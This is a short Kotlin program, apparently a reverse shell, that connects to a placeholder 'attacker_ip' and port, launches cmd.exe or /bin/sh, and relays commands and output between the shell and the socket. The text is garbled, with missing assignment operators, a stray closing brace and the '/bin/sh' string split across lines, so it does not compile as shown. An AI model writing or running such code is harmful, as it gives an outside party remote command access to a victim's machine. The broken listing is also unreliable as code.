import java.io.*

import java.net.Socket

fun main() {

val socket Socket("attacker_ip", attacker_port) sh"

}

val shell if (System.getProperty("os.name").startsWith("Windows")) "cmd.exe" else "/bin/

val process ProcessBuilder (shell).redirectErrorStream(true).start()

val out PrintWriter(socket.getOutputStream(), true)

val processInput BufferedReader (InputStreamReader(process.inputStream))

val socketInput BufferedReader (InputStreamReader(socket.getInputStream()))

processInput.lines().forEach { line -> out.println(line) }

socketInput.lines().forEach { line-> process.outputStream.write(line.toByteArray())

process.outputStream.flush()

}